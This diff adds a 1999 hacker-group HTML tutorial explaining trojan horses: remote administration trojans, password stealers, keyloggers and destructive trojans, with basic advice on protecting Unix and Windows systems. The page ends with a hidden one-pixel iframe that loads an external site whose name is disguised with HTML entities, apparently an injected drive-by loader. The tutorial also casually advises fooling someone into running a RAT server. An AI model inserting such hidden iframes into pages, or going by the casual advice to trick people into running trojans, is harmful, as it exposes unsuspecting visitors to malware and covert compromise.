@@ -1,0 +1,319 @@
+<HTML>
+
+<HEAD>
+<META NAME="Author" CONTENT="R a v e N and tHe mAnIaC">
+<META NAME="HTML Author" CONTENT="Penguin">
+<TITLE>Computer Trojan Horses</TITLE>
+</HEAD>
+
+<BODY BGCOLOR="#000000" TEXT="#FFFFFF">
+<H2><CENTER>Computer Trojan Horses / written by, <A HREF="mailto:barakirs@netvision.net.il">R a v e N</A> &amp; <A HREF="mailto:dancho@mbox.digsys.bg">tHe mAnIac</A><BR>(<A HREF="http:\\blacksun.box.sk">blacksun.box.sk</A>)</H2><HR></CENTER>
+
+version 1.0, 30/11/1999<BR>
+Converted to HTML by <A HREF="mailto:penguin20000@yahoo.com">Penguin</A>
+
+<OL>
+<B><U>Contents</B></U>
+<LI>What is a trojan?
+<LI>Why the name 'trojan horse'?
+<LI>Remote Administration Trojans
+<LI>How RATs work
+<LI>Using RATs for legitimate purposes
+<LI>Password Trojans
+<LI>Priviledges-Elevating Trojans
+<LI>Keyloggers
+<LI>Destructive Trojans
+<LI>Joke Programs
+<LI>Protecting Yourself Against Trojans
+<UL>
+<LI>Under Unix
+<LI>Under Windows
+</UL>
+</OL>
+			 		 	                              
+<B><U>What is a trojan?</B></U><BR>
+A trojan horse could be either:<BR>
+a) Unauthorized instructions contained within a legitimate program. These
+instrcutions perform functions unknown to (and probably unwanted by) the user.<BR>
+b) A legitimate program that has been altered by the placement of anauthorized
+instructions within it. These instructions perform functions unknown to (and
+probably unwanted by) the user.<BR>
+c) Any program that appears to perform a desirable and necessary function but
+that (because of unauthorized instructions within it) performs functions
+unknown to (and probably unwanted by) the user.
+
+<BR><BR>
+
+Under a restricted environment (a restricted Unix shell or a restricted
+Windows computer), malicious trojans can't do much, since they are restricted
+in their actions. But on a home PC, trojans can be lethal and quite
+destructive.
+
+<BR><BR>
+
+<B><U>Why the name 'trojan horse'?</B></U><BR>
+In the 12th century B.C., Greece declared war on the city of Troy. The dispute
+erupted when the prince of Troy abducted the queen of Sparta and declared that
+he wanted to make her his wife, which made the Greeks and especially the queen
+of Sparta quite furious.
+
+<BR><BR>
+
+The Greeks gave chase and engaged Troy in a 10-year war, but unfortunately
+for them, all of their efforts went down the drain. Troy was simply too well
+fortified.
+
+<BR><BR>
+
+In a last effort, the Greek army pretended to be retreating, leaving behind a
+hude wooden horse. The people of Troy saw the horse, and, thinking it was some
+kind of a present from the Greeks, pulled the horse into their city, without
+knowing that the finest soldiers of Greece were sitting inside it, since the
+horse was hollow.
+
+<BR><BR>
+
+Under the cover of night, the soldiers snuck out and opened the gates of the
+city, and later, together with the rest of the army, killed the entire army of
+Troy.
+
+<BR><BR>
+
+This is why such a program is called a trojan horse - it pretends to do
+something while it does something completely different, or does what it is
+supposed to be and hides it's malicious actions from the user's prying eyes.
+
+<BR><BR>
+
+During the rest of this text, we will explain about the most common types of
+trojan horses.
+
+<BR><BR>
+
+<B><U>Remote Administration Trojans</B></U><BR>
+These trojans are the most popular trojans now. Everyone wants to have
+them trojan because they let you have access to your victim's hard
+drive, and also perform many functions on his computer (open and close his
+CD-ROM drive, put message boxes on his computer etc'), which will scare off
+most computer users and are also a hell lot of fun to run on your friends or
+enemies.
+
+<BR><BR>
+
+Modern RAT'S (remote administration trojans) are very
+simple to use. They
+come packaged with two files - the server file and the client file (if you
+don't know which is which, look for a help file, a FAQ, a readme or
+instructions on the trojan's homepage). Just fool someone into runnig the
+server file and get his IP and you have FULL
+control over his/her computer
+(some trojans are limited by their functions, but more functions also mean
+larger server files. Some trojans are merely ment for the attacker to use them
+to upload another trojan to his target's computer and run it, hence they take
+very little disk space). You can also bind trojans into other programs
+which appear to be legitimate.
+
+<BR><BR>
+
+RAT'S have the common remote access trojan functions like:<BR>
+keylogging
+(logging the target's keystrokes (keyboard functions) and sometimes even
+interfering with them, thus being able to use your keyboard to type
+instead of the target and say weird things in chatrooms or scare the
+hell out of people), upload and download function, make a screenshot of the
+target's monitor and so on.
+
+<BR><BR>
+
+Some people use the trojans for malicious purposes. They either use them to
+irritate, scare or harm their enemies, scare the hell out of their friends or
+enemies and seem like a "super hacker" to them, getting information about
+people and spying on them or just get into people's computers and delete
+stuff. This is considered very lame.
+
+<BR><BR>
+
+There are many programs out there that detects the most common trojans (such
+as Nemesis at blacksun.box.sk, which also detects people trying to access
+your computer), but new trojans are
+released every day and it's pretty hard to
+keep track of things.
+
+<BR><BR>
+
+Trojans would usually want to automatically start whenever you boot-up your
+computer. If you use Windows, you can get b00tm0n from blacksun.box.sk (note:
+at the time this tutrial was released, b00tm0n was not ready yet, but it
+should be ready some time before year 2,000, so if you're reading this after
+Y2K, b00tm0n should probably be available at blacksun.box.sk). Under Unix, we
+suggest getting some sort of an IDS (Intrusion Detection System) programs to
+monitor your system.
+
+<BR><BR>
+
+Most Windows trojans hide
+from the Alt+Ctrl+Del menu (we havn't seen any Unix
+program that had the ability to hide itself from the processes list yet, but
+you can never know - one day someone might discover a way to do so. Hell,
+someone might have already did). This is bad because there are people who use
+the task list to see
+which process are running. There are programs that will
+tell me you exactly what processes are running on your computer (such as
+Wintop, which is the Windows version of the popular Unix program called top).
+Some trojans, however, use fake names and it's a little harder for certain
+people to realize that they are infected.
+
+<BR><BR>
+
+Also, some trojans might simply open an FTP server on your computer (usually
+NOT on port 21, the default FTP port, in order to be less noticable). The FTP
+server is, of course, unpassworded, or has a password which the attacker has
+determined, and allows the attacker to download, upload and execute files
+quickly and easily. For more info about FTP servers and FTP security, read our
+FTP security tutorial at <A HREF="http://blacksun.box.sk">blacksun.box.sk</A>.
+
+<BR><BR>
+
+<B><U>How RATs work</B></U><BR>
+Remote administration trojans open a port on your computer and bind themselves
+to it (make the server file listen to incoming connections and data going
+through these ports). Then, once someone runs his client program and
+enters the victim's IP, the trojan starts receiving commands from the
+attacker and runs them on the victim's computer.
+
+<BR><BR>
+
+Some trojans let you
+change this port
+into any other port and also put a password so only the person
+that infect this specific computer will be able to use the trojan. However,
+some of these password protections can be cracked due to bugs in the trojan
+(people who program RATs usually don't have much knowledge in the field of
+programming), and in some cases the creator of the trojan would also put a
+backdoor (which can be sometimes detected, under certain conditions) within
+the server file itself so he'll be able to access any computer running his
+trojan without the need to enter a password. This is called "a backdoor within
+a backdoor".
+
+<BR><BR>
+
+The most popular RATs are Netbus (because of it's simplicity), BO (has many
+functions and hides itself pretty good) and Sub7 (lots of functions and easy
+to use). These are all Windows RATs.
+
+<BR><BR>
+
+If you havn't done so already, it is advised to get some RAT and play around
+with it, just to see how the whole thing works.
+
+<B><U>Using RATs for legitimate purposes</B></U><BR>
+Some people use RATs to remotely administer computers they are allowed to have
+access to. This is all good and fine, but anyway, you should always be careful
+while working with RATs. Make sure you have legal access and the right to
+remotely administer a computer before using a RAT on it.
+
+<BR><BR>
+
+<B><U>Password Trojans</B></U><BR>
+Yes, password trojans. Password trojans scour your computer for password and
+then send them to the attacker or the author of the trojan. Whether it's your
+Internet password, your Hotmail password, your ICQ password or your IRC
+passwords, there is a trojan for every passsword.
+These trojans usually send the information back to the attacker via Email.
+
+<BR><BR>
+
+<B><U>Priviledges-Elevating Trojans</B></U><BR>
+These trojans would usually be used to fool system administrators. They can
+either be binded into a common system utility or pretend to be something
+unharmful and even quite useful and appealing. Once the administrator runs it,
+the trojan will give the attacker more priviledges on the system.
+These trojans can also be sent to less-priviledges users and give the attacker
+access to their account.
+
+<BR><BR>
+
+<B><U>Keyloggers</B></U><BR>
+These trojans are very simple. They log all of your keystrokes (including
+passwords), and then either save them on a file or Email them to the attacker
+once in a while.
+
+<BR><BR>
+
+Keyloggers usually don't take much disk space and can masquerade as important
+utilities, thus making them very hard to detect.
+Some keyloggers can also highlight passwords found in text boxes with titles
+such as 'enter password' or just the word password somewhere within the title
+text.
+
+<BR><BR>
+
+<B><U>Destructive Trojans</B></U><BR>
+These little fellows do nothing but damaging your computer. These trojans can
+destroy your entire hard drive, encrypt or just scramble important files and
+basically make you feel very unpleasent. I wouldn't want to bump into one in a
+dark alley.
+
+<BR><BR>
+
+Some might seem like joke programs, while they are actually tearing every file
+they encounter to pieces.
+
+<BR><BR>
+
+<B><U>Joke Programs</B></U><BR>
+Joke programs are nice, cute and unharmful. They can either pretend to be
+formatting your hard drive, sending all of your passwords to some evil
+cracker, self-destructing your computer, turning in all information about
+illegal and pirated software you might have on your computer to the FBI etc'.
+They are certainly no reason to worry about (except if you work in tech
+support, since unexperienced computer users tend to get scared off pretty
+easily by joke programs.
+
+<BR><BR>
+
+<B><U>Protecting Yourself Against Trojans</B></U><BR>
+<B><U>Under Unix</B></U><BR>
+If you are working on your PC, DO NOT work as root! If you run a trojan as
+root, you can endanger your entire system! The whole point in multi-users on a
+single-user system is limiting yourself in such cases (or in case you want to
+prevent yourself from doing anything stupid). Switch to root only when you
+NEED root, and when you know what you're running. Also, remember that even if
+you're working on a restricted environment, you still put the passwords and
+files you still have access to to risk. Also, if someone has a keylogger on
+your system, and you type in some passwords (especially the root password),
+they will be logged!
+
+<BR><BR>
+
+Also, DO NOT download any files from untrusted sources
+(small websites, underground websites, Usenet newsgroups, IRC etc'), even if
+it comes in the form of source code.
+
+<BR><BR>
+
+<B><U>Under Windows</B></U><BR>
+Windows is a whole lot different in this aspect. Limiting yourself under
+Windows is quite an annoyance. It is almost impossible to work like that, in
+comparison to Unix.
+
+<BR><BR>
+
+Also, make sure you don't run any untrusted software. There are much more evil
+Windows trojans for Windows than Unix, since people are more motivated to
+write trojans for Unix (because of all the security Unix imposes).
+Also, when running on a restricted Windows environment, you cannot just act
+like you're so protected and all. Remember that people can still steal
+passwords owned by the restricted user, and also, some trojans can break into
+administrator priviledges and then compromise your entire system, since
+Windows imposes such lame security.
+
+<BR><BR>
+
+Oh, and one last tip - you should try to download and use at least some of the
+types of trojans listed above, so you could get to know them better and be
+able to remove them in case you get infected.
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
